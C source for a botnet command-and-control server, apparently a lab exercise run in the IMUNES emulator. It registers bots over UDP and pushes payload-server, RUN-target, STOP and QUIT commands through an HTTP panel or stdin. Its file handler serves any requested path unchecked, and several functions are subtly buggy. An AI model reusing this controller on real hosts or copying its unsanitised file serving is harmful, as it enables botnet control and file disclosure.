#include <arpa/inet.h>
#include <ctype.h>
#include <err.h>
#include <getopt.h>
#include <netdb.h>
#include <netinet/in.h>
#include <pthread.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <sys/types.h>
#include <syslog.h>
#include <unistd.h>

#include "message.h"
#include "wrappers.h"

#define DEFAULT_TCP_PORT "80"   /* Serving HTTP requests */
#define DEFAULT_UDP_PORT "5555" /* Direct bot requests - non-changeable */
#define STDIN 0                 /* File descriptor for standard input */
#define MAX_BOTS 100            /* Maximum number of bots to handle */
#define REGMSG "REG\n"          /* Register to C&C with this message */
#define BUFSIZE 8192            /* Buffers size */

void get_ip_port_from_sockaddr(struct sockaddr *addr, char *ip, char *port);
void print_bots(struct ip_port *bots, short unsigned n_bots);
void send_pserv_info(struct ip_port *bots, short unsigned n_bots, bool localhost, char *protocol);
void send_run(struct ip_port *bots, short unsigned n_bots, bool local);
void send_stop(struct ip_port *bots, short unsigned n_bots);
void send_unknown(struct ip_port *bots, short unsigned n_bots);
void send_quit(struct ip_port *bots, short unsigned n_bots);
void send_msg(struct ip_port *bots, short unsigned n_bots, void *msg, ssize_t msglen);
void http_respond(int sock, char *req, struct ip_port *bots, short unsigned n_bots);
char *get_content_type(char *ext);
void print_help();

struct addrinfo hints;
int sockudp;
int socktcp;
char *basic_html_header;
char *html_index_page;

int main(int argc, char **argv) {
    char *tcp_port = DEFAULT_TCP_PORT;
    char *udp_port = DEFAULT_UDP_PORT;
    basic_html_header = "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n";
    html_index_page = "<html><body><h1>C&C commands</h1><ul>\r\n<li><a href=/bot/list>Ispis registriranih botova (/bot/list)</a></li>\r\n<li><a href=/bot/prog_tcp>PROG_TCP (/bot/prog_tcp) (server 10.0.0.20:1234)</a></li>\r\n<li><a href=/bot/prog_tcp_localhost>PROG_TCP (/bot/prog_tcp_localhost) (server 127.0.0.1:1234)</a></li>\r\n<li><a href=/bot/prog_udp>PROG_UDP (/bot/prog_udp) (server 10.0.0.20:1234)</a></li>\r\n<li><a href=/bot/prog_udp_localhost>PROG_UDP (/bot/prog_udp_localhost) (server 127.0.0.1:1234)</a></li>\r\n<li><a href=/bot/run>RUN (127.0.0.1:vat localhost:6789)</a></li>\r\n<li><a href=/bot/run2>RUN (20.0.0.11:1111 20.0.0.12:2222 20.0.0.13:dec-notes)</a></li>\r\n<li><a href=/bot/stop>STOP (/bot/stop)</a></li>\r\n<li><a href=/bot/quit>QUIT (/bot/quit)</a></li>\r\n</ul></body></html>";
    struct ip_port botlist[MAX_BOTS] = {0};
    short unsigned n_reg_bots = 0;

    if (argc == 2) {
        tcp_port = argv[1];
    } else if (argc > 2) {
        errx(1, "usage: %s [tcp_port]", argv[0]);
    }
    printf("Starting server on TCP port %s, UDP port %s\n", tcp_port, udp_port);

    // gonna listen on two sockets, one for HTTP one for UDP
    sockudp = Socket(AF_INET, SOCK_DGRAM, 0);  /* Direct bot requests UDP socket */
    socktcp = Socket(AF_INET, SOCK_STREAM, 0); /* HTTP bot requests TCP socket */

    // bind both
    struct addrinfo hints, *res;
    hints = (struct addrinfo){
        .ai_family = AF_INET,
        .ai_socktype = SOCK_DGRAM,
        .ai_flags = AI_PASSIVE,
    };

    Getaddrinfo(NULL, udp_port, &hints, &res);
    Bind(sockudp, res->ai_addr, res->ai_addrlen);
    freeaddrinfo(res);

    hints.ai_socktype = SOCK_STREAM;
    Getaddrinfo(NULL, tcp_port, &hints, &res);
    Bind(socktcp, res->ai_addr, res->ai_addrlen);
    Listen(socktcp, 10);
    freeaddrinfo(res);

    struct sockaddr *clientaddr = malloc(sizeof(struct sockaddr));
    socklen_t clientlen = sizeof(struct sockaddr_in);

    fd_set master;
    fd_set read_fds;
    int fdmax = socktcp > sockudp ? socktcp : sockudp;

    FD_ZERO(&master);
    FD_ZERO(&read_fds);

    FD_SET(sockudp, &master);
    FD_SET(socktcp, &master);
    FD_SET(STDIN, &master);

    char buf[BUFSIZE];  // buffer for reading data from sockets; must be enough for any request

    for (;;) {
        read_fds = master;
        Select(fdmax + 1, &read_fds, NULL, NULL, NULL);  // block indefinitely
        for (int i = 0; i <= fdmax; i++) {
            memset(&buf, 0, sizeof(buf));
            memset(clientaddr, 0, sizeof(struct sockaddr));
            if (!FD_ISSET(i, &read_fds)) continue;
            if (i == sockudp) {
                Recvfrom(sockudp, &buf, sizeof(buf), 0, clientaddr, &clientlen);
                if (strcmp(buf, "REG\n") == 0) {
                    if (n_reg_bots >= MAX_BOTS) {
                        printf("Maximum number of bots reached, ignoring request\n");
                        continue;
                    }
                    get_ip_port_from_sockaddr(clientaddr, botlist[n_reg_bots].ip, botlist[n_reg_bots].port);
                    n_reg_bots++;
                }
            } else if (i == socktcp) {
                printf("Recieving on tcp socket\n");
                int newsock = Accept(socktcp, clientaddr, &clientlen);
                Recv(newsock, &buf, sizeof(buf), 0);
                http_respond(newsock, buf, botlist, n_reg_bots);
                close(newsock);
            } else if (i == STDIN) {
                read(STDIN, &buf, sizeof(buf));
                if (strcmp(buf, "pt\n") == 0) {
                    send_pserv_info(botlist, n_reg_bots, 0, "tcp");
                } else if (strcmp(buf, "ptl\n") == 0) {
                    send_pserv_info(botlist, n_reg_bots, 1, "tcp");
                } else if (strcmp(buf, "pu\n") == 0) {
                    send_pserv_info(botlist, n_reg_bots, 0, "udp");
                } else if (strcmp(buf, "pul\n") == 0) {
                    send_pserv_info(botlist, n_reg_bots, 1, "udp");
                } else if (strcmp(buf, "l\n") == 0) {
                    print_bots(botlist, n_reg_bots);
                } else if (strcmp(buf, "r\n") == 0) {
                    send_run(botlist, n_reg_bots, 1);
                } else if (strcmp(buf, "r2\n") == 0) {
                    send_run(botlist, n_reg_bots, 0);
                } else if (strcmp(buf, "s\n") == 0) {
                    send_stop(botlist, n_reg_bots);
                } else if (strcmp(buf, "n\n") == 0) {
                    send_unknown(botlist, n_reg_bots);
                } else if (strcmp(buf, "q\n") == 0) {
                    send_quit(botlist, n_reg_bots);
                } else if (strcmp(buf, "h\n") == 0) {
                    print_help();
                } else {
                    printf("Nepoznata naredba!\n");
                    print_help();
                }
            }
        }
    }
    close(sockudp);
    close(socktcp);
    return 0;
}

void get_ip_port_from_sockaddr(struct sockaddr *addr, char *ip, char *port) {
    Inet_ntop(AF_INET, &((struct sockaddr_in *)addr)->sin_addr, ip, INET_ADDRSTRLEN);
    sprintf(port, "%d", ntohs(((struct sockaddr_in *)addr)->sin_port));
}

void print_bots(struct ip_port *bots, short unsigned n_bots) {
    printf("Registered bots:\n");
    for (int i = 0; i < n_bots; i++) {
        printf("%s:%s\n", bots[i].ip, bots[i].port);
    }
}

/**
 * Sends payload server info to all bots
 * @param bots
 * @param n_bots
 * @param localhost Whether the payload server is localhost, false if 10.0.0.20
 * @param protocol "tcp" or "udp"
 */
void send_pserv_info(struct ip_port *bots, short unsigned n_bots, bool localhost, char *protocol) {
    hints.ai_socktype = SOCK_DGRAM;
    struct MSG msg = {0};
    msg.command = strcmp(protocol, "tcp") == 0 ? COM_PROG_TCP : COM_PROG_UDP;
    strcpy(msg.targets[0].ip, "10.0.0.20");
    strcpy(msg.targets[0].port, "1234");
    send_msg(bots, n_bots, &msg, sizeof(char) + sizeof(struct ip_port));
}

void send_run(struct ip_port *bots, short unsigned n_bots, bool local) {
    hints.ai_socktype = SOCK_DGRAM;
    struct MSG msg = {0};
    msg.command = COM_RUN;
    if (local) {
        msg.targets[0] = (struct ip_port){
            .ip = "127.0.0.1",
            .port = "vat",
        };
        msg.targets[1] = (struct ip_port){
            .ip = "localhost",
            .port = "6789",
        };
    } else {
        msg.targets[0] = (struct ip_port){
            .ip = "20.0.0.11",
            .port = "1111",
        };
        msg.targets[1] = (struct ip_port){
            .ip = "20.0.0.12",
            .port = "2222",
        };
        msg.targets[2] = (struct ip_port){
            .ip = "20.0.0.13",
            .port = "hostmon",
        };
        ssize_t msglen = 1 + (local ? 2 : 3) * sizeof(struct ip_port);
        send_msg(bots, n_bots, &msg, msglen);
    }
}

void send_stop(struct ip_port *bots, short unsigned n_bots) {
    hints.ai_socktype = SOCK_DGRAM;
    struct MSG msg = {0};
    msg.command = COM_STOP;
    send_msg(bots, n_bots, &msg, sizeof(char));
}

void send_unknown(struct ip_port *bots, short unsigned n_bots) {
    hints.ai_socktype = SOCK_DGRAM;
    char *msg = "NEPOZNATA\n";
    send_msg(bots, n_bots, msg, strlen(msg));
}

void send_quit(struct ip_port *bots, short unsigned n_bots) {
    hints.ai_socktype = SOCK_DGRAM;
    struct MSG msg = {0};
    msg.command = COM_QUIT;
    send_msg(bots, n_bots, &msg, sizeof(char));
}

void send_msg(struct ip_port *bots, short unsigned n_bots, void *msg, ssize_t msglen) {
    struct addrinfo *res;
    msg = (struct MSG *)msg;
    for (int i = 0; i < n_bots; i++) {
        char *ip = bots[i].ip;
        char *port = bots[i].port;
        Getaddrinfo(ip, port, &hints, &res);
        Sendto(sockudp, msg, msglen, 0, res->ai_addr, res->ai_addrlen);
        freeaddrinfo(res);
    }
}

void http_respond(int sock, char *req, struct ip_port *bots, short unsigned n_bots) {
    if (strstr(req, "GET /") == NULL) {
        printf("Not a GET request, sending 405\n");
        char *header = "HTTP/1.1 405 Method Not Allowed\r\nContent-Type: text/html\r\n\r\n";
        char *body = "<html><body><h1>405 Method Not Allowed</h1></body></html>";
        char *response = malloc(strlen(header) + strlen(body) + 1);
        memset(response, 0, strlen(header) + strlen(body) + 1);
        strcpy(response, header);
        strcat(response, body);
        Send(sock, response, strlen(response), 0);
        free(response);
        return;
    }

    char *starting = strstr(req, " ");
    if (starting == NULL) {
        printf("No space in request\n");
        return;
    }
    starting++;
    char *ending = strstr(starting, " ");
    if (ending == NULL) {
        printf("No second space in request\n");
        return;
    }

    char *reqpath = malloc(ending - starting + 1);
    strncpy(reqpath, starting, ending - starting);
    reqpath[ending - starting] = '\0';

    printf("\n\nRequested path: %s\n\n", reqpath);

    char *body;
    if (strcmp(reqpath, "/") == 0) {
        char *header = basic_html_header;
        char *body = html_index_page;
        char *response = malloc(strlen(basic_html_header) + strlen(html_index_page) + 1);
        memset(response, 0, strlen(basic_html_header) + strlen(html_index_page) + 1);
        strcpy(response, header);
        strcat(response, body);
        Send(sock, response, strlen(response), 0);
        free(response);
        return;
    } else if (strncmp(reqpath, "/bot/", 5) != 0) {
        printf("Got a file request\n");
        char *filename = reqpath + 1;  // skip the /
        printf("Checking for filename: %s\n", filename);
        FILE *fp = fopen(filename, "r");
        if (access(filename, F_OK) == -1) {
            printf("File does not exist\n");
            char *header = "HTTP/1.1 404 Not Found\r\nContent-Type: text/html\r\n\r\n";
            char *body = "<html><body><h1>404 Not Found</h1></body></html>";
            char *response = malloc(strlen(header) + strlen(body) + 1);
            strcpy(response, header);
            strcat(response, body);
            Send(sock, response, strlen(response), 0);
            free(response);
            free(reqpath);
            return;
        }
        printf("File exists\n");
        char *ext = strrchr(filename, '.');
        char *content_type = get_content_type(ext);
        printf("Content type is %s\n", content_type);
        if (content_type == NULL) {
            printf("Requested nsupported file type with extension %s\n", ext);
            char *header = "HTTP/1.1 415 Unsupported Media Type\r\nContent-Type: text/html\r\n\r\n";
            char *body = "<html><body><h1>404 Not Found</h1></body></html>";
            char *response = malloc(strlen(header) + strlen(body) + 1);
            strcpy(response, header);
            strcat(response, body);
            Send(sock, response, strlen(response), 0);
            free(response);
            free(reqpath);
            return;
        }
        fseek(fp, 0, SEEK_END);
        long file_size = ftell(fp);
        rewind(fp);

        char content_length[20];
        sprintf(content_length, "%ld", file_size);

        char *header = malloc(strlen("HTTP/1.1 200 OK\r\nContent-Type: \r\nContent-Length: \r\n\r\n") + strlen(content_type) + strlen(content_length) + 1);
        memset(header, 0, strlen("HTTP/1.1 200 OK\r\nContent-Type: \r\nContent-Length: \r\n\r\n") + strlen(content_type) + strlen(content_length) + 1);
        strcpy(header, "HTTP/1.1 200 OK\r\nContent-Type: ");
        strcat(header, content_type);
        strcat(header, "\r\nContent-Length: ");
        strcat(header, content_length);
        strcat(header, "\r\n\r\n");

        char *response = malloc(strlen(header) + file_size + 1);
        strcpy(response, header);
        free(header);

        printf("Sending\n");
        Send(sock, response, strlen(response), 0);

        ssize_t nread = 1;
        while (!feof(fp) && nread > 0) {
            nread = fread(response + strlen(header), 1, BUFSIZE, fp);
            Send(sock, response, strlen(header) + nread, 0);
        }

        fclose(fp);
        free(response);
        free(reqpath);

        return;
    } else if (strcmp(reqpath, "/bot/list") == 0) {
        body = malloc(BUFSIZE);
        strcpy(body, "<html><body><h1>Registered bots</h1><ul>\r\n");
        for (int i = 0; i < n_bots; i++) {
            strcat(body, "<li>");
            strcat(body, bots[i].ip);
            strcat(body, ":");
            strcat(body, bots[i].port);
            strcat(body, "</li>\r\n");
        }
    } else if (strcmp(reqpath, "/bot/prog_tcp") == 0) {
        send_pserv_info(bots, n_bots, 0, "tcp");
        body = "<html><body><h1>PROG_TCP</h1></body></html>";
    } else if (strcmp(reqpath, "/bot/prog_tcp_localhost") == 0) {
        send_pserv_info(bots, n_bots, 1, "tcp");
        body = "<html><body><h1>PROG_TCP</h1></body></html>";
    } else if (strcmp(reqpath, "/bot/prog_udp") == 0) {
        send_pserv_info(bots, n_bots, 0, "udp");
        body = "<html><body><h1>PROG_UDP</h1></body></html>";
    } else if (strcmp(reqpath, "/bot/prog_udp_localhost") == 0) {
        send_pserv_info(bots, n_bots, 1, "udp");
        body = "<html><body><h1>PROG_UDP</h1></body></html>";
    } else if (strcmp(reqpath, "/bot/run") == 0) {
        send_run(bots, n_bots, 1);
        body = "<html><body><h1>RUN</h1></body></html>";
    } else if (strcmp(reqpath, "/bot/run2") == 0) {
        send_run(bots, n_bots, 0);
        body = "<html><body><h1>RUN</h1></body></html>";
    } else if (strcmp(reqpath, "/bot/stop") == 0) {
        send_stop(bots, n_bots);
        body = "<html><body><h1>STOP</h1></body></html>";
    } else if (strcmp(reqpath, "/bot/quit") == 0) {
        send_quit(bots, n_bots);
        body = "<html><body><h1>QUIT</h1></body></html>";
    } else {
        printf("Unknown request\n");
        send_unknown(bots, n_bots);
        body = "<html><body><h1>UNKNOWN</h1></body></html>";
    }

    char *header = basic_html_header;

    if (body == NULL) {
        body = html_index_page;
        return;
    }

    char *response = malloc(strlen(header) + strlen(body) + 1);
    strcpy(response, header);
    strcat(response, body);
    Send(sock, response, strlen(response), 0);
    free(response);
    free(reqpath);
    printf("Sent response, returning\n");
    close(sock);
}

char *get_content_type(char *ext) {
    if (strncmp(ext, ".html", strlen(".html")) == 0) {
        return "text/html";
    } else if (strncmp(ext, ".txt", strlen(".txt")) == 0) {
        return "text/plain";
    } else if (strncmp(ext, ".gif", strlen(".gif")) == 0) {
        return "image/gif";
    } else if (strncmp(ext, ".jpg", strlen(".jpg")) == 0) {
        return "image/jpeg";
    } else if (strncmp(ext, ".pdf", strlen(".pdf")) == 0) {
        return "application/pdf";
    }
    return NULL;
}

void print_help() {
    printf("pt... bot klijentima šalje poruku PROG_TCP\n");
    printf("      struct MSG:1 10.0.0.20 1234\\n\n");
    printf("ptl...bot klijentima šalje poruku PROG_TCP \n");
    printf("      struct MSG:1 127.0.0.1 1234\\n");
    printf("pu... bot klijentima šalje poruku PROG_UDP\n");
    printf("      struct MSG:2 10.0.0.20 1234\\n");
    printf("pul... bot klijentima šalje poruku PROG_UDP\n");
    printf("      struct MSG:2 127.0.0.1 1234\\n");
    printf("r...  bot klijentima šalje poruku RUN s adresama lokalnog računala:\n");
    printf("       struct MSG:3 127.0.0.1 vat localhost 6789\\n\n");
    printf("r2... bot klijentima šalje poruku RUN s adresama računala iz IMUNES-a:\n");
    printf("       struct MSG:3 20.0.0.11 1111 20.0.0.12 2222 20.0.0.13 hostmon\n");
    printf("s... bot klijentima šalje poruku STOP (struct MSG:4)\n");
    printf("l... lokalni ispis adresa bot klijenata\n");
    printf("n... šalje poruku: NEPOZNATA\\n\n");
    printf("q... bot klijentima šalje poruku QUIT i završava s radom (struct MSG:0)\n");
    printf("h... ispis naredbi\n");
}
